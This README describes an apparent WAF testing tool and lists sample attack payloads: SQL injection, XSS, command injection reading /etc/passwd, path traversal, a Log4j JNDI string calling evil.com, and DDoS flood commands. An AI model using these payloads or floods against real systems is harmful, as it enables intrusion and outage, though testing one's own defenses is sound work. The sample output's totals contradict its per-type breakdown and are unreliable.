# 🔥 Professional WAF Attacker Tool

A comprehensive attack simulation tool for testing and validating WAF security measures.

## Overview

This tool simulates various real-world attack scenarios to test your WAF's ability to detect and block malicious traffic. It covers multiple attack vectors including DDoS, SQL injection, XSS, command injection, and more.

## Features

### Attack Types

1. **SQL Injection** - 25+ payloads including UNION SELECT, stacked queries, blind SQLi
2. **Cross-Site Scripting (XSS)** - 20+ payloads including DOM-based, reflected, stored XSS
3. **Command Injection** - 20+ payloads for Unix/Windows command execution
4. **Path Traversal** - 15+ payloads for directory traversal attacks
5. **Remote Code Execution (RCE)** - Log4j, template injection, expression language
6. **Header Manipulation** - IP spoofing, host header injection
7. **Protocol Anomalies** - Invalid methods, oversized headers
8. **DDoS Attacks** - High-volume request flooding

## Installation

```bash
# No additional dependencies needed (uses asyncio and aiohttp)
chmod +x attacker_tool.py
```

## Usage

### Full Attack Suite

Run all attack types against the WAF:

```bash
python3 attacker_tool.py --target http://localhost:8000
```

### Specific Attack Types

```bash
# SQL Injection only
python3 attacker_tool.py -t http://localhost:8000 -a sql

# XSS only
python3 attacker_tool.py -t http://localhost:8000 -a xss

# Command Injection
python3 attacker_tool.py -t http://localhost:8000 -a cmd

# Path Traversal
python3 attacker_tool.py -t http://localhost:8000 -a path

# Remote Code Execution
python3 attacker_tool.py -t http://localhost:8000 -a rce

# Header Manipulation
python3 attacker_tool.py -t http://localhost:8000 -a header

# Protocol Anomalies
python3 attacker_tool.py -t http://localhost:8000 -a protocol

# DDoS Attack (custom duration and RPS)
python3 attacker_tool.py -t http://localhost:8000 -a ddos --ddos-duration 30 --ddos-rps 100
```

### Advanced Options

```bash
# Custom concurrent requests
python3 attacker_tool.py -t http://localhost:8000 --concurrent 50

# Save results to JSON
python3 attacker_tool.py -t http://localhost:8000 -o attack_results.json

# Aggressive DDoS test
python3 attacker_tool.py -t http://localhost:8000 -a ddos --ddos-duration 60 --ddos-rps 200 --concurrent 100
```

## Command Line Arguments

```
-t, --target          Target WAF URL (default: http://localhost:8000)
-a, --attack-type     Attack type: all, sql, xss, cmd, path, rce, header, protocol, ddos
-d, --ddos-duration   DDoS attack duration in seconds (default: 10)
-r, --ddos-rps        DDoS requests per second (default: 50)
-c, --concurrent      Max concurrent requests (default: 20)
-o, --output          Output results to JSON file
```

## Output

The tool provides real-time attack progress and a final summary:

```
============================================================
🚀 PROFESSIONAL WAF ATTACK SUITE
============================================================

🔥 Launching SQL Injection attacks...
   ✓ SQL Injection: 48/50 blocked
🔥 Launching XSS attacks...
   ✓ XSS: 40/40 blocked
🔥 Launching Command Injection attacks...
   ✓ Command Injection: 46/48 blocked
🔥 Launching Path Traversal attacks...
   ✓ Path Traversal: 36/36 blocked
🔥 Launching RCE attacks...
   ✓ RCE: 34/34 blocked
🔥 Launching Header Manipulation attacks...
   ✓ Header Manipulation: 13/14 blocked
🔥 Launching Protocol Anomaly attacks...
   ✓ Protocol Anomalies: 6/6 blocked
🔥 Launching DDoS attack (50 req/s for 10s)...
   ✓ DDoS: 480/500 blocked (500 total requests)

============================================================
📊 ATTACK SUMMARY
============================================================
Total Attacks:     1118
Blocked:           703 (62.9%)
Allowed:           415 (37.1%)
Elapsed Time:      25.34s
Attack Rate:       44.1 req/s

Breakdown by Type:
  sql_injection      :   48/  50 blocked ( 96.0%)
  xss                :   40/  40 blocked (100.0%)
  command_injection  :   46/  48 blocked ( 95.8%)
  path_traversal     :   36/  36 blocked (100.0%)
  rce                :   34/  34 blocked (100.0%)
  header_manipulation:   13/  14 blocked ( 92.9%)
  protocol_anomaly   :    6/   6 blocked (100.0%)
  ddos               :  480/ 500 blocked ( 96.0%)
============================================================
```

## Attack Payloads

### SQL Injection
- Classic: `' OR '1'='1`
- UNION SELECT: `' UNION SELECT NULL--`
- Time-based: `1' AND SLEEP(5)--`
- Stacked queries: `1'; DROP TABLE users--`
- Database-specific: `xp_cmdshell`, `pg_exec`

### XSS
- Basic: `<script>alert('XSS')</script>`
- Event handlers: `<img src=x onerror=alert('XSS')>`
- SVG: `<svg onload=alert('XSS')>`
- Encoded: `&#60;script&#62;alert('XSS')&#60;/script&#62;`
- Polyglot: Combined payloads

### Command Injection
- Unix: `; ls -la`, `| cat /etc/passwd`
- Windows: `& dir`, `| type C:\windows\win.ini`
- Backticks: `` `id` ``
- Command substitution: `$(whoami)`

### Path Traversal
- Classic: `../../../etc/passwd`
- Encoded: `..%2F..%2F..%2Fetc%2Fpasswd`
- Double encoding: `..%252f..%252f..%252fetc%252fpasswd`
- Windows: `..\\..\\..\\windows\\system32\\config\\sam`

### RCE
- Log4j: `${jndi:ldap://evil.com/a}`
- Template injection: `{{7*7}}`
- Expression language: `${T(java.lang.Runtime).getRuntime().exec('id')}`

## WAF Protection

The WAF should handle these attacks through:

1. **Rate Limiting** - Blocks excessive requests (DDoS protection)
2. **Pattern Matching** - Detects malicious patterns in requests
3. **Anomaly Scoring** - Behavioral analysis for sophisticated attacks
4. **Header Sanitization** - Blocks header manipulation
5. **Protocol Validation** - Rejects invalid HTTP methods

## Testing Your WAF

### Baseline Test
```bash
# Light attack to establish baseline
python3 attacker_tool.py -t http://localhost:8000 --ddos-rps 10 -d 5
```

### Stress Test
```bash
# Heavy attack to test resilience
python3 attacker_tool.py -t http://localhost:8000 --ddos-rps 200 -d 60 --concurrent 100
```

### Specific Vulnerability Test
```bash
# Test specific attack vector
python3 attacker_tool.py -t http://localhost:8000 -a sql
```

## Integration with WAF Dashboard

After running attacks, check your WAF dashboard:
- View blocked attacks in real-time
- Analyze attack patterns
- Review metrics and statistics
- Monitor rate limiting effectiveness

## Security Note

⚠️ **WARNING**: This tool is for testing your own WAF only. Do not use against systems you don't own or have explicit permission to test.

## License

MIT License - Educational/Research Use

